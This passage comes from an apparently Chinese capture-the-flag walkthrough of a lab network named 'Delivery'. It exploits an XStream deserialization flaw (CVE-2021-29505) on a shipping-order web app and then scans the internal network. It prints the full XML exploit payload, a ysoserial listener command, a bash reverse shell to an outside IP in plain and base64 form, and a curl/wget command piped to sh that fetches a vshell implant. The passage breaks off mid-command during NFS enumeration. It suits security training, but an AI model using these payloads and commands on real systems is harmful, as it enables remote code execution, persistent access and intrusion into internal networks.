&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.7.2&lt;/version&gt;</span><br><span class="line">        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;groupId&gt;com.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ezjava&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;name&gt;ezjava&lt;/name&gt;</span><br><span class="line">    &lt;description&gt;ezjava&lt;/description&gt;</span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;java.version&gt;1.8&lt;/java.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.4.16&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/3.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/4.png"></p><p>整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">39.99.248.209  ftp 匿名登录  xstream cc 公司发货单</span><br></pre></td></tr></table></figure><p>再看看8080</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/5.png"></p><h1 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点"></a>外围打点</h1><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><h3 id="xstream反序列化打CC依赖"><a href="#xstream反序列化打CC依赖" class="headerlink" title="xstream反序列化打CC依赖"></a>xstream反序列化打CC依赖</h3><p>发包发现可以打xstream反序列化打CC依赖</p><p><font style="color:rgb(102, 102, 102);background-color:rgba(27, 31, 35, 0.05);">CVE-2021-29505</font></p><p><a href="https://cloud.tencent.com/developer/article/1839233">https://cloud.tencent.com/developer/article/1839233</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/47.113.229.136/1098 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi8xMDk4IDA+JjE=</span><br></pre></td></tr></table></figure><p>先起服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi8xMDk4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/6.png"></p><p>然后监听1098端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1098</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/7.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">POST /just_sumbit_it HTTP/1.1</span><br><span class="line">Host: 39.99.248.209:8080</span><br><span class="line">Content-Length: 3117</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line">Accept: application/xml, text/xml, */*; q=0.01</span><br><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line">Origin: http://39.99.248.209:8080</span><br><span class="line">Referer: http://39.99.248.209:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                            &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;</span><br><span class="line">                                &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;</span><br><span class="line">                                    &lt;names&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                    &lt;/names&gt;</span><br><span class="line">                                    &lt;ctx&gt;</span><br><span class="line">                                        &lt;environment/&gt;</span><br><span class="line">                                        &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                            &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;47.113.229.136&lt;/string&gt;</span><br><span class="line">                                                &lt;int&gt;1099&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                                            &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                        &lt;/registry&gt;</span><br><span class="line">                                        &lt;host&gt;47.113.229.136&lt;/host&gt;</span><br><span class="line">                                        &lt;port&gt;1099&lt;/port&gt;</span><br><span class="line">                                    &lt;/ctx&gt;</span><br><span class="line">                                &lt;/candidates&gt;</span><br><span class="line">                            &lt;/aliases&gt;</span><br><span class="line">                        &lt;/nullIter&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><p>注意端口占用问题</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/8.png"></p><p>反弹shell成功</p><p>上线vshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL -m180 http://47.113.229.136:8899/slt||wget -T180 -q http://47.113.229.136:8899/slt)|sh</span><br></pre></td></tr></table></figure><p>直接就是root权限</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/9.png"></p><p>那么我们直接读取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.22.13.14  39.99.248.209  ftp 匿名登录  xstream cc 公司发货单 已拿下</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/10.png"></p><h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/11.png"></p><p>挂载代理、内网信息收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# chmod +x fscan </span><br><span class="line">root@ubuntu:/tmp# ls</span><br><span class="line">bash  fscan  hsperfdata_root  tomcat.8080.4881516889748131666  tomcat-docbase.8080.4051554996308753889</span><br><span class="line">root@ubuntu:/tmp# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.13.14  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe0a:1f78  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:16:3e:0a:1f:78  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 166688  bytes 222218064 (222.2 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 44421  bytes 14711358 (14.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 1644  bytes 141394 (141.3 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 1644  bytes 141394 (141.3 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# ./fscan -h 172.22.13.14/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-06-19 22:49:31] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-06-19 22:49:31] [INFO] 开始信息扫描</span><br><span class="line">[2025-06-19 22:49:31] [INFO] CIDR范围: 172.22.13.0-172.22.13.255</span><br><span class="line">[2025-06-19 22:49:31] [INFO] 生成IP范围: 172.22.13.0.%!d(string=172.22.13.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-06-19 22:49:31] [INFO] 解析CIDR 172.22.13.14/24 -&gt; IP范围 172.22.13.0-172.22.13.255</span><br><span class="line">[2025-06-19 22:49:31] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-06-19 22:49:31] [INFO] 开始主机扫描</span><br><span class="line">[2025-06-19 22:49:31] [SUCCESS] 目标 172.22.13.14    存活 (ICMP)</span><br><span class="line">[2025-06-19 22:49:31] [SUCCESS] 目标 172.22.13.6     存活 (ICMP)</span><br><span class="line">[2025-06-19 22:49:31] [SUCCESS] 目标 172.22.13.28    存活 (ICMP)</span><br><span class="line">[2025-06-19 22:49:31] [SUCCESS] 目标 172.22.13.57    存活 (ICMP)</span><br><span class="line">[2025-06-19 22:49:34] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-06-19 22:49:34] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.14:21</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.6:88</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.6:139</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.28:135</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.6:135</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.28:445</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.6:445</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.6:389</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.28:139</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.28:3306</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.14:22</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.57:80</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.28:80</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.57:22</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.14:80</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.28:8000</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 端口开放 172.22.13.14:8080</span><br><span class="line">[2025-06-19 22:49:34] [SUCCESS] 服务识别 172.22.13.14:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]</span><br><span class="line">[2025-06-19 22:49:35] [SUCCESS] 服务识别 172.22.13.14:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-06-19 22:49:35] [SUCCESS] 服务识别 172.22.13.57:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-06-19 22:49:39] [SUCCESS] 服务识别 172.22.13.6:88 =&gt; </span><br><span class="line">[2025-06-19 22:49:39] [SUCCESS] 服务识别 172.22.13.6:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-06-19 22:49:40] [SUCCESS] 服务识别 172.22.13.28:445 =&gt; </span><br><span class="line">[2025-06-19 22:49:40] [SUCCESS] 服务识别 172.22.13.6:445 =&gt; </span><br><span class="line">[2025-06-19 22:49:40] [SUCCESS] 服务识别 172.22.13.6:389 =&gt; </span><br><span class="line">[2025-06-19 22:49:40] [SUCCESS] 服务识别 172.22.13.28:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-06-19 22:49:40] [SUCCESS] 服务识别 172.22.13.57:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-06-19 22:49:40] [SUCCESS] 服务识别 172.22.13.28:8000 =&gt; </span><br><span class="line">[2025-06-19 22:49:40] [SUCCESS] 服务识别 172.22.13.28:80 =&gt; [http]</span><br><span class="line">[2025-06-19 22:49:41] [SUCCESS] 服务识别 172.22.13.14:8080 =&gt; [http]</span><br><span class="line">[2025-06-19 22:49:41] [SUCCESS] 服务识别 172.22.13.14:80 =&gt; [http]</span><br><span class="line">[2025-06-19 22:49:48] [SUCCESS] 服务识别 172.22.13.28:3306 =&gt;  Banner:[J.5.7.26.FHN6DP5.MN X&lt;zXXJ.g mysql_native_password !.#08S01Got packets out of order]</span><br><span class="line">[2025-06-19 22:50:39] [SUCCESS] 服务识别 172.22.13.28:135 =&gt; </span><br><span class="line">[2025-06-19 22:50:39] [SUCCESS] 服务识别 172.22.13.6:135 =&gt; </span><br><span class="line">[2025-06-19 22:50:40] [INFO] 存活端口数量: 17</span><br><span class="line">[2025-06-19 22:50:40] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-06-19 22:50:40] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-06-19 22:50:40] [SUCCESS] 网站标题 http://172.22.13.28       状态码:200 长度:2525   标题:欢迎登录OA办公平台</span><br><span class="line">[2025-06-19 22:50:40] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.13.28</span><br><span class="line">主机名: WIN-HAUWOLAO</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.13.28</span><br><span class="line">[2025-06-19 22:50:40] [SUCCESS] 网站标题 http://172.22.13.14       状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[2025-06-19 22:50:40] [SUCCESS] 网站标题 http://172.22.13.57       状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-06-19 22:50:40] [SUCCESS] NetBios 172.22.13.6     DC:XIAORANG\WIN-DC         </span><br><span class="line">[2025-06-19 22:50:40] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-06-19 22:50:40] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.13.6</span><br><span class="line">主机名: WIN-DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.13.6</span><br><span class="line">[2025-06-19 22:50:40] [SUCCESS] 网站标题 http://172.22.13.14:8080  状态码:200 长度:3655   标题:公司发货单</span><br><span class="line">[2025-06-19 22:50:40] [SUCCESS] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-06-19 22:50:40] [SUCCESS] 网站标题 http://172.22.13.28:8000  状态码:200 长度:170    标题:Nothing Here.</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/12.png"></p><p>再扫一下这个端口2049</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# ./fscan -h 172.22.13.14/24 -p 2049</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-06-19 22:56:08] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-06-19 22:56:08] [INFO] 开始信息扫描</span><br><span class="line">[2025-06-19 22:56:08] [INFO] CIDR范围: 172.22.13.0-172.22.13.255</span><br><span class="line">[2025-06-19 22:56:08] [INFO] 生成IP范围: 172.22.13.0.%!d(string=172.22.13.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-06-19 22:56:08] [INFO] 解析CIDR 172.22.13.14/24 -&gt; IP范围 172.22.13.0-172.22.13.255</span><br><span class="line">[2025-06-19 22:56:08] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-06-19 22:56:08] [INFO] 开始主机扫描</span><br><span class="line">[2025-06-19 22:56:08] [SUCCESS] 目标 172.22.13.14    存活 (ICMP)</span><br><span class="line">[2025-06-19 22:56:08] [SUCCESS] 目标 172.22.13.6     存活 (ICMP)</span><br><span class="line">[2025-06-19 22:56:08] [SUCCESS] 目标 172.22.13.28    存活 (ICMP)</span><br><span class="line">[2025-06-19 22:56:08] [SUCCESS] 目标 172.22.13.57    存活 (ICMP)</span><br><span class="line">[2025-06-19 22:56:11] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-06-19 22:56:11] [INFO] 有效端口数量: 1</span><br><span class="line">[2025-06-19 22:56:11] [SUCCESS] 端口开放 172.22.13.57:2049</span><br><span class="line">[2025-06-19 22:56:16] [SUCCESS] 服务识别 172.22.13.57:2049 =&gt; </span><br><span class="line">[2025-06-19 22:56:16] [INFO] 存活端口数量: 1</span><br><span class="line">[2025-06-19 22:56:16] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-06-19 22:56:16] [INFO] 加载的插件: </span><br><span class="line">[2025-06-19 22:56:16] [SUCCESS] 扫描已完成: 0/0</span><br></pre></td></tr></table></figure><p>整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.13.14  39.99.248.209  ftp 匿名登录  xstream cc 公司发货单 已拿下 入口机</span><br><span class="line">172.22.13.57 CentOS  nfs</span><br><span class="line">172.22.13.28 OA系统、mysql弱口令root/123456</span><br><span class="line">172.22.13.6  WIN-DC DC域 </span><br></pre></td></tr></table></figure><p>查看一下共享文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">showmount -e</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# proxychains4 showmount -e 172.22.13.57                                                                                                                                                                                         